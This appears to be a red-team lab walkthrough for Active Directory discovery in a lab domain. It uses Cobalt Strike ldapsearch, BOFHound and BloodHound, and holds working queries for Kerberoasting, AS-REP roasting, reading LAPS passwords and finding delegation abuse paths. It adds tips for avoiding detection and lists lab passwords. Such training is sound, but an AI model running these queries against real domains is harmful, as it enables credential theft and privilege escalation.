# Discovery Lab  

>The objective of this lab is to do discovery of the Active Directory domain.  Collect data and map attack paths in BloodHound in OPSEC-🟢SAFE way, instead of using collectors that will be 🚨 detected.

## Auth Check

>Establish proper Kerberos token before running ldapsearch, inject a TGT OPSEC-🟢SAFE  

```cs
kerberos_ticket_use C:\path\to\rsteel.kirbi
ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```

## Domain-Level LDAPSEARCH    

```cs
// GPO abuse — find GPOs applied to current machine/user OUs where we can write
ldapsearch (&(objectClass=groupPolicyContainer)) --attributes displayName,gPCFileSysPath,ntsecuritydescriptor

// Kerberoastable accounts (SPN holders) — weak password = privesc path
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName,memberOf

// LAPS — find computers where current user can read ms-Mcs-AdmPwd
ldapsearch (&(objectClass=computer)(ms-Mcs-AdmPwd=*)) --attributes name,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

// AdminSDHolder protected accounts (SDProp targets — ACL abuse paths)
ldapsearch (&(adminCount=1)(objectClass=user)) --attributes samAccountName,memberOf,ntsecuritydescriptor

// Delegation misconfig — unconstrained delegation (TGT theft risk)
ldapsearch (&(samAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes name,userAccountControl,msDS-AllowedToDelegateTo

// 🧠 BOFHound 📂 output 📝 logs❗
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```

## Delegation LDAPSEARCH  

```cs
// Unconstrained delegation — any computer/user with unconstrained delegation

// If a server has this, force a DC to auth to it → capture DC TGT → DCSync → DA
ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl

// Constrained delegation — can impersonate any user to the delegated service
// msDS-AllowedToDelegateTo set = protocol transition possible
ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

// Resource-based constrained delegation (RBCD) — target can impersonate on behalf of another
ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
```

## Kerberoast AS-REP Targets LDAPSEARCH

```cs

// Kerberoastable service accounts — has SPN, not krbtgt, not disabled
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName

// AS-REP roastable — no Kerberos pre-authentication required
// Can request AS-REP hash without any credentials
ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName

// Accounts with descriptions — operators sometimes store passwords in the description field
ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description
```

## LAPS LDAPSEARCH

```cs
// LAPS — if ms-Mcs-AdmPwd is readable, you get the local admin password for that host 
ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd
```

## Privileged account LDAPSEARCH

```cs
// AdminCount=1 user accounts — all accounts under AdminSDHolder protection
// These are privileged — DA, EA, Schema Admins, Backup Operators, etc.
ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf

// Domain trust enumeration
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

// trustDirection: 1=INBOUND, 2=OUTBOUND, 3=BIDIRECTIONAL
// trustAttributes: 32=WITHIN_FOREST (parent-child), 8=FOREST_TRANSITIVE (cross-forest)
```

----  

## BOFHound  

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the Beacon.
3. `ldapsearch` Enumerate the domain, users, groups, OUs, and GPOs.
4. Copy the raw Beacon logs to the Attacker Desktop 
5. From the Windows 🖥️ Terminal, open a tab for Ubuntu🟣🐧.
6. `cd /mnt/c/Users/Attacker/Desktop`
7. `scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .`
8. The password is `Passw0rd!`.
9. 🧠 BOFHound 📂 output 📝 logs❗parsed for BloodHound❗ 
10. `bofhound -i logs`

----  

## BloodHound

1. Run BloodHound.
  1. From the Start Menu, open Docker Desktop.
  1. Click the **Containers** link on the left-hand side.
  1. Start all the containers by clicking the 'play' button, 🧠  wait for them to start.
  1. From the taskbar, open Microsoft Edge.
  1. Click the BloodHound shortcut in the favourites bar, or manually browse to `http://localhost:8080/ui/login`
  1. The browser should autofil the credentials.  If not, use `admin` : `eA%N4frBrnn2`.

⚠️ You'll likely be prompted to set a new password. You can change it to anything you want.⚠️

1. Ingest the BOFHound 🧠 data.
  1. After first login, click the 'start by uploading your data' link.
  1. On the new page, click the 'Upload File(s)' button and select the JSON files produced by BOFHound 🧠.

⚠️ They will be in *C:\\Users\\Attacker\\Desktop\\*.

  1. Wait until the status reaches 'Complete'.

1. Click the **Explore** link in the left-hand menu.
1. Select the Cypher query search box.
1. Using the following cypher query, search for GPOs in BloodHound:
  1. `Match (n:GPO) return n`
  1. Click **Run**.

1. Select the 'Workstation Admins' GPO.
  1. Take note of its Gpcpath.
  1. Expand its 'Affected Objects' and select 'Computers'.

1. Select each computer and note their Obiect ID.

## Restricted Groups Data

1. Using the gpcpath for the Workstations Admins GPO, download its **GptTmpl.inf** file using Beacon.

    ```Beacon-nocolor
    ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
    download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
    ```
1. Sync the file to your Attacker Desktop.

⚠️ View > Downloads.

1. Open the file in Notepad (or VSCode).
  1. Note the SID of the domain group.

1. Add the custom edges in BloodHound.

    ```Cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```
    ```Cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```

BloodHound will now show that rsteel has local administrative privileges on WKSTN-1 and 2.

⚠️ In this lab, you have used LDAP queries and BloodHound to map part of the CONTOSO domain.  

---

## OPSEC Warnings & Exam-Day Notes

### ldapsearch Returns 0 Results — WinRM Token Limitation

`ldapsearch` binds to the DC using the beacon's current Kerberos token. A beacon landed via
`jump winrm64` has a **Type 3 network logon token** — it is non-forwardable and does not carry
Kerberos credentials for onward connections to the DC.

**Symptom:**
```
Binding to 10.10.120.1
retrieved 0 results total
```

---

### OPSEC-🔴UNSAFE Never Use⛔

`net computers` ⛔ `net *` OPSEC-🔴UNSAFE beacon commands run via the `shell` built-in which spawns  
`cmd.exe` — OPSEC-🔴UNSAFE. ⛔ fails with Error 5 from a network logon token.  
`net computers`  OPSEC-🔴UNSAFEE — spawns cmd.exe   `ldapsearch (samAccountType=805306369)`  
`net users`   OPSEC-🔴UNSAFE — spawns cmd.exe   `ldapsearch (samAccountType=805306368)`  
`net groups`  OPSEC-🔴UNSAFE — spawns cmd.exe  `ldapsearch (samAccountType=268435456)`  
